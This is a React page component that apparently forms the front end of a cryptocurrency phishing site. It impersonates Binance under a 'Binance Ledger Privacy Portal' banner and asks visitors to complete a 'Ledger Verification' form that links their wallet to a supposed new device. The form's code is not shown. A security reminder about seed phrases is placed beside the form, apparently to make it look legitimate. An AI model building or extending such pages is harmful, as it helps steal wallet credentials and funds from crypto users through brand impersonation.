
import React from "react";
import BinanceHeader from "@/components/BinanceHeader";
import BinanceFooter from "@/components/BinanceFooter";
import BinanceLedgerForm from "@/components/BinanceLedgerForm";

const Index = () => {
  return (
    <div className="min-h-screen flex flex-col bg-binance-dark text-white">
      <BinanceHeader />
      
      <main className="flex-grow">
        {/* Hero Section */}
        <div className="bg-binance-black py-10 md:py-16 relative overflow-hidden">
          <div className="container mx-auto px-4">
            <div className="max-w-5xl mx-auto">
              <div className="flex flex-col items-center text-center relative z-10">
                <h1 className="text-3xl md:text-4xl font-bold mb-4">
                  Binance Ledger <span className="text-binance-yellow">Privacy Portal</span>
                </h1>
                <p className="text-gray-300 text-lg mb-6 max-w-2xl">
                  Secure your crypto assets with the most trusted hardware wallet in the industry
                </p>
                <div className="flex justify-center space-x-4 mb-8">
                  <div className="w-12 h-px bg-binance-yellow my-auto"></div>
                  <span className="text-binance-yellow px-4">Trusted by millions</span>
                  <div className="w-12 h-px bg-binance-yellow my-auto"></div>
                </div>
              </div>
            </div>
          </div>
          
          {/* Ledger Image positioned to overlap sections */}
          <div className="absolute right-0 top-1/2 transform -translate-y-1/2 z-20 hidden md:block">
            <img 
              src="/lovable-uploads/938c67ba-a1d3-4451-8b8d-ea78479af87c.png" 
              alt="Binance Ledger Device" 
              className="max-w-md h-auto"
            />
          </div>
          
          {/* Mobile view for Ledger image */}
          <div className="md:hidden flex justify-center mt-6 mb-4">
            <img 
              src="/lovable-uploads/938c67ba-a1d3-4451-8b8d-ea78479af87c.png" 
              alt="Binance Ledger Device" 
              className="max-w-[250px] h-auto"
            />
          </div>
        </div>
        
        {/* Form Section */}
        <div className="container mx-auto px-4 py-10 relative">
          <div className="max-w-4xl mx-auto mb-12 pt-10">
            <h2 className="text-2xl font-bold mb-4">Ledger Verification</h2>
            <p className="text-gray-300">
              To ensure the security of your assets, please complete the verification process below. 
              This form will help us confirm your identity and link your wallet to your new Binance Ledger device.
            </p>
          </div>
          
          <BinanceLedgerForm />
          
          <div className="max-w-2xl mx-auto mt-12 bg-binance-darkGray/50 border border-gray-700 rounded-lg p-6">
            <h3 className="text-xl font-medium mb-3 text-binance-yellow">Security Reminder</h3>
            <p className="text-gray-300 mb-4">
              Binance will never ask for your private keys or seed phrases through unofficial channels. 
              Always verify you are on the official Binance website before entering sensitive information.
            </p>
            <ul className="list-disc pl-5 text-gray-300 space-y-2">
              <li>Never share your private keys or seed phrases with anyone</li>
              <li>Always verify the URL is correct before entering information</li>
              <li>Enable two-factor authentication for all your accounts</li>
              <li>Be cautious of phishing attempts and suspicious emails</li>
            </ul>
          </div>
        </div>
      </main>
      
      <BinanceFooter />
    </div>
  );
};

export default Index;
